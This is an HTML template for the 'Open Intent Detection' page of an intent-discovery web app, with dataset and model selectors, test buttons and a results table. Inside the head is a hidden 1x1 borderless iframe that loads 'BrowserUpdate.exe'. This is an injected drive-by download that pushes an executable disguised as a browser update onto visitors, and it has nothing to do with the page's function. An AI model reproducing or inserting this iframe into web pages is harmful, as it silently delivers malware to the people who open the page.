<!DOCTYPE html>
<html class="x-admin-sm">

    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
        <meta charset="UTF-8">
        <title>New Intent Discovery System</title>
        <meta name="renderer" content="webkit">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta name="viewport" content="width=device-width,user-scalable=yes, minimum-scale=0.4, initial-scale=0.8,target-densitydpi=low-dpi" />
        <link rel="stylesheet" href="/static/lib/xadmin/css/font.css">
        <link rel="stylesheet" href="/static/lib/xadmin/css/xadmin.css">
        <script type="text/javascript" src="/static/lib/layui/layui.js" charset="utf-8"></script>
        <script type="text/javascript" src="/static/lib/xadmin/js/xadmin.js"></script>
        <!-- 让IE8/9支持媒体查询，从而兼容栅格 -->
        <!--[if lt IE 9]>
            <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
            <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->
    </head>
    <body>
        <!-- model-list -->
        <div class="layui-fluid">
            <div class="layui-row layui-col-space15">
                <div class="layui-col-md12">
                    <div class="layui-card">
                        <div class="layui-card-body ">

                            <div style="font-weight:700; font-size:20px;color:#555555">Open Intent Detection</div>
                            <div style="color:#6F6F6F">--Here,You can detection new intents</div>
    
                            <form class="layui-form" enctype="multipart/form-data">
                                
                                
                                    <div class="layui-input-inline">
                                        
                                        <div class="layui-input-inline ">
                                            <div class="layui-form-item" style="position: relative;left: 57%">
                                                <select id = 'dataset_select_detection' name="dataset_select_detection" lay-filter="dataset_select_detection" onclick="switchBySelect()"> 
                                                    <option value="" disabled>Dataset</option>
                                                    {% for lines in dataset_list %}
                                                        <option  value="{{lines.dataset_id}}" >{{lines.dataset_name}}</option>
                                                    {% endfor %}
                                                </select>
                                            </div>
                                        </div>
    
                                        <div class="layui-input-inline" >
                                            <div class="layui-form-item" style="position: relative;left: 77%">
                                                <select id="model_detection" name="model_detection" >
                                                    <option  selected >Open Intent Detection</option>
                                                        {% for lines in modelList_detection %}
                                                            {% if lines.model_name == 'MSP' %}
                                                            <option selected  value="{{lines.model_name}}" >{{lines.model_name}}</option>
                                                            {% else % }
                                                            <option  value="{{lines.model_name}}" >{{lines.model_name}}</option>
                                                            {% endif %}
                                                        {% endfor %}
                                                </select>
                                            </div>
                                        </div>
    
                                       
                                        <div class="layui-input-inline">
    
                                            <div class="layui-input-inline">
                                                <div class="layui-form-item" style="position:relative">
                                                    <button class="layui-btn" lay-filter="detection_test" lay-submit="" style=" position: relative;left: 400%">Test</button>
                                                </div>
                                            </div>
                                            <div class="layui-input-inline">
                                                <div class="layui-form-item" style="position:relative">
                                                    <button class="layui-btn layui-btn-danger"   style="position: relative;left: 600%" type ='reset'>Clear</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
    
                                <!-- <div class="layui-card-body ">
                                    <div class="layui-input-inline">
                                        <div class="layui-input-inline">
                                            <div class="layui-form-item" style="position:relative">
                                                <button class="layui-btn" lay-filter="detection_test" lay-submit="" style="position: relative;left: 400%">Test</button>
                                            </div>
                                        </div>
    
                                        <div class="layui-input-inline">
                                            <div class="layui-form-item" style="position:relative">
                                                <button class="layui-btn layui-btn-danger"   style="position: relative;left: 600%" type ='reset'>Clear</button>
                                            </div>
                                        </div>
                                    </div>
                                </div>  -->
                               
                            </form> 
    
                            <div style="font-weight:700; font-size:20px;color:#555555">Model Results Analysis</div>
                            <div style="color:#6F6F6F">--Show the model results</div>
                            <div class="layui-card-body ">
                                <table class="layui-table layui-form" id="classTable" lay-filter="demoEvent" >
                                </table>
                            </div>
                            <div style="font-weight:700; font-size:20px;color:#555555">Model Detail Analysis</div>
                            <div style="color:#6F6F6F">--Show the reasons for the model results</div>
                            
                            <!-- <a id="download" href="">Download</a> -->
                                <div class="layui-form-item">
                                    <div id="doc" style="display:none;position:absolute;right: 0px;z-index:999">
                                        <div class="layui-input-inline">
                                                <div class="layui-input-inline">
                                                    <div style="font-weight:600; font-size:18px;color:#555555">Select Intent Class: </div>
                                                </div>
                                                <div class="layui-input-inline">
                                                    <select id="select_data" style="display:none" lay-filter='select_data'>
                                                    
                                                    </select>
                                                </div>
                                        </div>    
                                    </div>
                                </div>
    
                                <div class="layui-form-item">
                                    <div id="image1" style="width:800px; height:450px; left:0; right:0; margin:auto;" ></div>
                                </div>
                        </div>
                    </div>
                
                </div>
            </div>
        </div>

  
        <script>layui.use(['form', 'layer','jquery','table'],
            function() {
                $ = layui.jquery;
                var form = layui.form,
                layer = layui.layer;
                table = layui.table;

                var classTable = table.render({
                    elem: '#classTable',
                    url: '/annotation/getClassListByDatasetNameAndClassType',
                    cols: [[
                        {field: 'label_name', title: 'Known Intens' , align: 'center'},
                        {field: 'label_text_num', title: 'Numbers' , align: 'center'}
                    ]],
                    where: {
                        "dataset_name": "banking",
                        "class_type": "known"
                    }
                });


                //监听单元格事件
                table.on('tool(demoEvent)', function(obj){
                    var data = obj.data;
                    // console.log(data)
                    if(obj.event === 'detail'){
                        xadmin.open('Dataset Details','/thedataset/details/?dataset_id='+data.dataset_id,720,500)
                    }else if(obj.event === 'edit'){
                        xadmin.open('Edit Dataset','/thedataset/toEdit/?dataset_id='+data.dataset_id,720,500)
                    }else if(obj.event === 'delete'){
                        member_del(obj, data.dataset_name)
                    }
                });

            });
            
            
        </script>
        <script></script>
    </body>

    

</html>